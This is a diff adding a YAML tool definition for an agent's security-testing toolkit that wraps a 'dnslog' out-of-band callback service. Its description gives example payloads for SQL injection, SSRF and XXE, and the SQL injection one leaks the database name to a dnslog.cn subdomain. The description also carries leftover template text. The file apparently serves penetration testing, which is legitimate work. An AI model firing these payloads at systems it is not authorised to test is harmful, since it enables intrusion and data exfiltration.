@@ -1,0 +1,58 @@
+name: "dnslog"
+command: "python3"
+args:
+  - "-c"
+enabled: true
+short_description: "Wrapper for the dnslog command"
+description: |
+  Wrapper for the $toolName command or embedded helper script.
+
+  **Key Features:**
+  - Structured parameters for repeatable execution
+  - Suitable for security testing and automation workflows
+  - Returns command output for further orchestration
+
+  **Use Cases:**
+  - Targeted validation and assessment tasks
+  - Repeatable command execution from the agent runtime
+  - Evidence collection in larger workflows
+
+  **Key Features：**
+
+  **Use Cases：**
+    - Examples:`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\abc'))`
+    - Examples:`http://target.com/api?url=http://xxx.dnslog.cn`
+    - Examples:`<!ENTITY xxe SYSTEM "http://xxx.dnslog.cn">`
+
+  **Workflow：**
+  1. Use `operation=get_domain` to obtain a temporary domain such as `abc123.dnslog.cn`.
+  2. Use that domain in the validation payload.
+  3. Use `operation=get_records` to check for DNS query records.
+  4. If records appear, the payload executed and the issue is likely present.
+
+  **Notes：**
+parameters:
+  - name: "operation"
+    type: "string"
+    description: |
+      Parameter for the dnslog tool.
+    required: true
+    position: 0
+    format: "positional"
+  - name: "domain"
+    type: "string"
+    description: |
+      Target domain name.
+
+    required: false
+    position: 1
+    format: "positional"
+  - name: "wait_time"
+    type: "int"
+    description: |
+      Parameter for the dnslog tool.
+
+    required: false
+    position: 2
+    format: "positional"
+    default: 0
